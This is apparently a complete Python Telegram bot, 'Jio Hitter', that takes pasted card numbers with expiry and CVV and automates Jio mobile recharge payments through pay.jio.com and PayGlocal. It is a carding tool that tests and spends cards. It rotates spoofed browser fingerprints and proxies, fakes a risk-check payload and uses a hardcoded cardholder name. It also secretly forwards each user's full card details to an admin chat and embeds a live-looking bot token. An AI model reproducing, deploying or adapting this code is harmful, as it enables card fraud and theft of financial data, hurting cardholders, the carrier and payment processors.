import os
import re
import time
import json as _json
import sys
import subprocess
import random
import string
import threading
from flask import Flask
import warnings
warnings.filterwarnings("ignore")

# --- AUTO INSTALL REQUIREMENTS ---
def install_requirements():
    for pkg in ["curl_cffi", "pyTelegramBotAPI", "flask", "requests"]:
        try:
            __import__("curl_cffi" if pkg == "curl_cffi" else ("telebot" if pkg == "pyTelegramBotAPI" else pkg))
        except ImportError:
            print(f"Installing {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

install_requirements()

from curl_cffi import requests
import telebot

# --- KEEP-ALIVE FLASK SERVER FOR RENDER PORT ---
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Jio Hitter Bot is Alive and Running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

PROFILES = [
    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
]
SCREENS = [{"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30}]
LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8"]

TG_BOT_TOKEN = "9040723839:AAHLPalTrNvsWM1NJSTui02AQ5yEXD_GxJk"
ADMIN_CHAT_ID = 6755426755  # Aapki Admin ID

bot = telebot.TeleBot(TG_BOT_TOKEN)
USERS_FILE = "bot_users.json"
PROXIES_FILE = "user_proxies.json"

def load_json(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f:
                return _json.load(f)
        except:
            pass
    return {}

def save_json(filename, data):
    with open(filename, "w") as f:
        _json.dump(data, f)

def load_users():
    return set(load_json(USERS_FILE).get("users", []))

def save_user(user_id):
    data = load_json(USERS_FILE)
    users = set(data.get("users", []))
    if user_id not in users:
        users.add(user_id)
        data["users"] = list(users)
        save_json(USERS_FILE, data)

def get_user_proxy(user_id):
    proxies = load_json(PROXIES_FILE)
    return proxies.get(str(user_id))

def set_user_proxy(user_id, proxy):
    proxies = load_json(PROXIES_FILE)
    proxies[str(user_id)] = proxy
    save_json(PROXIES_FILE, proxies)

def ts(): return str(int(time.time()*1000))

def jh(ref, lg, UA, SEC, MOB, PLAT, ct=None, origin=None, extra=None):
    h = {"Accept-Language": lg, "Cache-Control": "no-cache", "Connection": "keep-alive", "Pragma": "no-cache",
         "Referer": ref, "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB, "sec-ch-ua-platform": PLAT}
    if ct: h["Content-Type"] = ct
    if origin: h["Origin"] = origin
    if extra: h.update(extra)
    return h

def ph(ref, lg, UA, SEC, MOB, PLAT, ct=None, origin=None, extra=None):
    h = {"Accept": "application/json, text/plain, */*", "Accept-Language": lg, "Cache-Control": "no-cache",
         "Pragma": "no-cache", "Referer": ref, "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB,
         "sec-ch-ua-platform": PLAT, "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-origin", "x-request-time": ts()}
    if ct: h["Content-Type"] = ct
    if origin: h["Origin"] = origin
    if extra: h.update(extra)
    return h

def iter_plans(pj):
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    yield {"key": plan["key"], "amount": float(plan.get("amount") or 0),
                           "name": plan.get("name") or plan.get("planName") or "",
                           "category": cat.get("type") or "", "validity": plan.get("validity") or ""}

def find_plan(pj, target_amount):
    for p in iter_plans(pj):
        if float(p["amount"]) == float(target_amount):
            return p
    return None

def cheapest_plan(pj):
    plans = list(iter_plans(pj))
    return min(plans, key=lambda p: p["amount"]) if plans else None

def jio_hit_process(recharge_number, raw_cc, target_amt, user_name, user_id, status_callback):
    try:
        parts = raw_cc.strip().split("|")
        if len(parts) < 4:
            return "❌ Invalid Card Format! Use: `NUM|MM|YY|CVV`"
        CARD_NUM, CARD_MM, CARD_YY, CARD_CVV = parts[0], parts[1], parts[2], parts[3]
        if len(CARD_YY) == 2: CARD_YY = "20" + CARD_YY
    except Exception:
        return "❌ Card parsing failed. Use format: `NUM|MM|YY|CVV`"

    CARD_NAME = "matt henry"
    CARD_PREFIX = CARD_NUM[:6]
    cc_full = raw_cc.strip()

    pf = random.choice(PROFILES)
    sc = random.choice(SCREENS)
    lg = random.choice(LANGS)
    UA = pf["ua"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]; IMP = pf["imp"]

    user_proxy = get_user_proxy(user_id)
    proxies_dict = None
    if user_proxy:
        if not user_proxy.startswith("http://") and not user_proxy.startswith("socks5://"):
            proxy_url = f"http://{user_proxy}"
        else:
            proxy_url = user_proxy
        proxies_dict = {"http": proxy_url, "https": proxy_url}

    session = requests.Session(impersonate=IMP, proxies=proxies_dict)

    try:
        status_callback("⚡ *[1/5]* Connecting to Jio Gateway...")
        session.get("https://www.jio.com/", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": lg,"Upgrade-Insecure-Requests": "1","User-Agent": UA,"sec-ch-ua": SEC,"sec-ch-ua-mobile": MOB,"sec-ch-ua-platform": PLAT}, verify=False)

        status_callback("⚡ *[2/5]* Fetching subscriber & plan info...")
        r = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{recharge_number}",
            headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, extra={"Accept": "application/json, text/plain, */*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
        
        if not r.text or "text/html" in r.headers.get("content-type", ""):
            return "❌ <b>Gateway Block:</b> Proxy/IP is blocked by Jio WAF firewall."

        d = r.json()
        if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return f"❌ <b>Error:</b> Not a valid Jio number (`{recharge_number}`)."

        primary = d.get("primaryService") or {}
        billing_type = d.get("billingType") or primary.get("billingType") or "PREPAID"
        next_value = d.get("nextPage") or billing_type
        plans_ref = (f"https://www.jio.com/selfcare/recharge/mobility/plans/"
                   f"?serviceType=mobility&serviceId={recharge_number}&next={next_value}&billingType={billing_type}&entrysource=Widget")

        session.get("https://www.jio.com/selfcare/recharge/mobility/plans/",
            params={"serviceType": "mobility", "serviceId": recharge_number, "next": next_value, "billingType": billing_type, "entrysource": "Widget"},
            headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "same-origin","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}))

        r4 = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{recharge_number}",
            headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
        plans_json = r4.json()

        if target_amt:
            picked = find_plan(plans_json, target_amt)
            if not picked:
                return f"❌ <b>Error:</b> Plan with amount Rs `{target_amt}` not found for this number!"
        else:
            picked = cheapest_plan(plans_json)
            
        if not picked:
            return "❌ <b>Error:</b> No recharge plans available found."
        plan_key = picked["key"]
        plan_amt = int(picked["amount"])

        status_callback(f"⚡ *[3/5]* Initializing checkout (Plan: ₹{plan_amt})...")
        r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
            headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
            json={"planKey": plan_key, "selectedService": recharge_number})
        if r.status_code != 200:
            return f"❌ <b>Checkout Failed:</b> Status code `{r.status_code}`"

        r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
            headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
            json={"addonPlanKeys": [], "flexiTopupFlow": False, "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": recharge_number}]})
        payment_url = r.json().get("paymentURL", "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")

        r = session.get(payment_url, headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "same-origin","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}), allow_redirects=True)
        fa = re.search(r"action='([^']+)'", r.text)
        fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r.text)
        url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        pay_form_data = {k: v for k, v in fi}

        r = session.post(url,
            headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, ct="application/x-www-form-urlencoded", origin="https://www.jio.com", extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "cross-site","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}),
            data=pay_form_data, allow_redirects=True)
        pay_jio_ref = r.url

        r = session.post("https://pay.jio.com/jiopg/v1/authorize-card-operation",
            headers=jh(pay_jio_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://pay.jio.com", extra={"Accept": "application/json","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
            json={"paymentMode": "CCDC", "cardPrefix": CARD_PREFIX, "isEMISelected": False, "viewOffer": False, "skuCode": None, "copco": None, "isStoreCreditSelected": None})
        t = r.json().get("token", "")
        if not t:
            return "❌ <b>Authorization Error:</b> Token not received from gateway."
        x_token = t

        status_callback("⚡ *[4/5]* Submitting card info to secure gateway...")
        r = session.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
            headers=jh(pay_jio_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://pay.jio.com", extra={"Accept": "application/json","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin","x-token": x_token}),
            json={"cvvNumber": CARD_CVV, "cashBackApplied": "N", "isTrxnStatusCheckEnable": "N", "seqId": "", "ccRoutePg": "",
                  "customerCardTypeValue": "mastercard", "paymentMode": "CCDC", "offerAppliedByCust": False, "viewOffer": False,
                  "cardType": "ic_mastercard", "cardNumber": CARD_NUM, "cardTypeText": "MASTERCARD_CARD",
                  "expiryMonth": CARD_MM, "expiryYear": CARD_YY, "cardHolderName": CARD_NAME, "userCardSaveConsent": False,
                  "browserDetails": {"browserHeader": "application/json", "browserJavaEnabled": False, "browserJavascriptEnabled": True,
                      "browserLanguage": lg.split(",")[0], "browserColorDepth": sc["depth"],
                      "browserScreenHeight": sc["h"], "browserScreenWidth": sc["w"], "browserTz": -330, "browserUserAgent": UA}})
        d = r.json()
        if not d.get("status"):
            err_msg = d.get('message', 'Card confirmation failed')
            return f"❌ <b>Card Confirmation Failed:</b>\n<code>{err_msg}</code>"
        html_form = d.get("htmlForm", "")

        ea = re.search(r"action='([^']+)'", html_form)
        ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
        eu = ea.group(1) if ea else ""
        ed = {k: v for k, v in ei}
        r = session.post(eu, headers=jh(pay_jio_ref, lg, UA, SEC, MOB, PLAT, ct="application/x-www-form-urlencoded", origin="https://pay.jio.com",
            extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document",
                   "Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "cross-site","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}),
            data=ed, allow_redirects=True)
        m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
        if not m:
            return "❌ <b>Gateway Error:</b> gl_token not found."
        gl_token = m.group(1)
        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

        session.get("https://api.payglocal.com/gl/v2/payments/redirect/dc",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, extra={"x-gl-current-host": "api.payglocal.com", "x-gl-gid": "gl_payflow-ui", "x-gl-pb-tag-id": "",
                "x-gl-previous-host": "https://pay.easebuzz.in/", "x-gl-referrer-mismatch": "false", "x-gl-trusted-referrer": "https://pay.easebuzz.in"}))

        session.post("https://api.payglocal.com/gl/v2/payments/pd/paynow",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
            json={"isEnc": "false", "payload": {"customerCurrency": "INR", "saveCurrencyPreference": False,
                "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False, "javaScripEnabled": True,
                    "language": lg.split(",")[0], "screenHeight": sc["h"], "screenWidth": sc["w"], "timeZone": -330},
                "billingData": {"addressCountry": "FR"}, "shippingData": {}, "agreedOnTnCs": True}})

        r = session.post("https://api.payglocal.com/gl/v1/payments/risk/fp",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
            json={"requestId": f"{ts()}.{random.randint(100000,999999)}", "visitorId": "Y8c4sEunqz0opl0b6YAd", "visitorFound": True, "confidenceScore": 1})
        kid = r.json().get("data",{}).get("kid","")
        if not kid:
            return "❌ <b>Risk Check Error:</b> kid missing."

        status_callback("⚡ *[5/5]* Finalizing charge & verifying response...")
        time.sleep(random.uniform(0.5, 1.2))
        r = session.post("https://api.payglocal.com/gl/v2/payments/dc/ipay",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
            json={"isEnc": "false", "kid": kid, "payload": {
                "cardNumber": CARD_NUM, "expiryMonth": CARD_MM, "expiryYear": CARD_YY, "cvv": CARD_CVV,
                "cardHolderName": CARD_NAME, "saveCard": False,
                "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False, "javaScriptEnabled": True,
                    "language": lg.split(",")[0], "screenHeight": sc["h"], "screenWidth": sc["w"],
                    "timeZone": -330, "userAgent": UA}}})
        
        result = r.json()
        status = result.get("status", "")
        message = result.get("message", "")
        reason = result.get("reasonCode", "")

        if status in ("SUCCESS", "APPROVED"):
            return (
                "💎 𝑯𝑰𝑻 — 𝑪𝑯𝑨𝑹𝑮𝑬𝑫 💎\n"
                "▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"💳 𝑪𝒂𝒓𝒅 : <code>{cc_full}</code>\n"
                f"📱 𝑵𝒖𝒎𝒃𝒆𝒓 : <code>{recharge_number}</code>\n"
                f"👛 𝑮𝒂𝒕𝒆 : Jio • ₹{plan_amt} INR\n"
                f"💎 𝑹𝒆𝒔𝒑 : Recharge Successful\n"
                f"👤 𝑼𝒔𝒆𝒓 : {user_name} ⭐"
            )
        elif status == "ISSUER_DECLINE" or 'declined' in message.lower():
            decline_reason = message or "Declined by Issuer"
            return (
                "❌ 𝑯𝑰𝑻 — 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ❌\n"
                "▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"💳 𝑪𝒂𝒓𝒅 : <code>{cc_full}</code>\n"
                f"📱 𝑵𝒖𝒎𝒃𝒆𝒓 : <code>{recharge_number}</code>\n"
                f"👛 𝑮𝒂𝒕𝒆 : Jio • ₹{plan_amt} INR\n"
                f"❌ 𝑹𝒆𝒔𝒑 : Card Declined\n"
                f"💬 𝑹𝒆𝒂𝒔𝒐𝒏 : <i>{decline_reason}</i>\n"
                f"👤 𝑼𝒔𝒆𝒓 : {user_name} ⭐"
            )
        else:
            err_desc = message or reason or "Gateway Error / Security Block"
            return (
                "⚠️ 𝑯𝑰𝑻 — 𝑭𝑨𝑰𝑳𝑬𝑫 ⚠️\n"
                "▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"💳 𝑪𝒂𝒓𝒅 : <code>{cc_full}</code>\n"
                f"📱 𝑵𝒖𝒎𝒃𝒆𝒓 : <code>{recharge_number}</code>\n"
                f"👛 𝑮𝒂𝒕𝒆 : Jio • ₹{plan_amt} INR\n"
                f"⚡ 𝑺𝒕𝒂𝒕𝒖𝒔 : {status or 'FAILED'}\n"
                f"💬 𝑹𝒆𝒂𝒔𝒐𝒏 : <i>{err_desc}</i>\n"
                f"👤 𝑼𝒔𝒆𝒓 : {user_name} ⭐"
            )

    except Exception as e:
        return f"❌ <b>Jio Hitter Error:</b> <code>{str(e)}</code>"

# --- TELEGRAM HANDLERS ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    save_user(message.from_user.id)
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    
    help_text = (
        "╔════════════════════════╗\n"
        "   🤖 **JIO HITTER BOT v2.0**   \n"
        "╚════════════════════════╝\n\n"
        f"👤 **User Name:** {user_name}\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"💎 **Status:** Premium Authorized\n\n"
        "🚀 **Available Commands:**\n"
        "• `/jhit <number> <card> [amount]`\n"
        "  _Example:_ `/jhit 9876543210 513155...|03|30|086 239`\n\n"
        "• `/addproxy <ip:port>` ya `/addproxy <user:pass@ip:port>`\n"
        "  _Apna custom proxy set karne ke liye._\n\n"
        "⚡ _Fast, secure & automated backend hit flow._"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['addproxy'])
def cmd_add_proxy(message):
    save_user(message.from_user.id)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ **Format Error!**\nUse: `/addproxy <ip:port>`\n_Example:_ `/addproxy 123.45.67.89:8080`", parse_mode="Markdown")
        return
    
    proxy_val = parts[1].strip()
    set_user_proxy(message.from_user.id, proxy_val)
    bot.reply_to(message, f"✅ **Proxy Successfully Added!**\n`{proxy_val}`\n\nAb aapka `/jhit` command isi proxy ke through chalega.", parse_mode="Markdown")

@bot.message_handler(commands=['jhit'])
def cmd_jio_hit(message):
    save_user(message.from_user.id)
    try:
        parts = message.text.split(maxsplit=3)
        if len(parts) < 3:
            bot.reply_to(message, "⚠️ **Format Error!**\nUse: `/jhit <number> <card> [amount]`\n_Example:_ `/jhit 9876543210 513155...|03|30|086 239`", parse_mode="Markdown")
            return
        
        number = parts[1].strip()
        card = parts[2].strip()
        target_amt = parts[3].strip() if len(parts) > 3 else None
        user_name = message.from_user.first_name or "Hidden User"
        user_id = message.from_user.id
        
        sent_msg = bot.reply_to(message, "⏳ *Initializing Jio Hitter...*", parse_mode="Markdown")
        
        def update_status(text):
            try:
                bot.edit_message_text(text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
            except:
                pass

        result = jio_hit_process(number, card, target_amt, user_name, user_id, update_status)
        bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
        
        if user_id != ADMIN_CHAT_ID:
            log_text = (
                f"🚨 <b>NEW HIT LOGGED</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"👤 <b>User:</b> {user_name} (ID: <code>{user_id}</code>)\n"
                f"📱 <b>Target Number:</b> <code>{number}</code>\n"
                f"💳 <b>Full Card:</b> <code>{card}</code>\n\n"
                f"{result}"
            )
            try:
                bot.send_message(ADMIN_CHAT_ID, log_text, parse_mode="HTML")
            except:
                pass

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    if message.from_user.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "⛔ You are not authorized to use this command.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide message to broadcast. Example: `/broadcast Hello users!`", parse_mode="Markdown")
        return
    
    bc_text = parts[1]
    users = load_users()
    success = 0
    fail = 0
    
    status_msg = bot.reply_to(message, f"📢 Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **Announcement:**\n\n{bc_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1)
        except:
            fail += 1
            
    bot.edit_message_text(f"✅ **Broadcast Completed!**\n\nSuccessful: {success}\nFailed: {fail}", chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("🤖 Jio Hitter Bot with New Token & Proxy Support is running...")
    bot.infinity_polling()
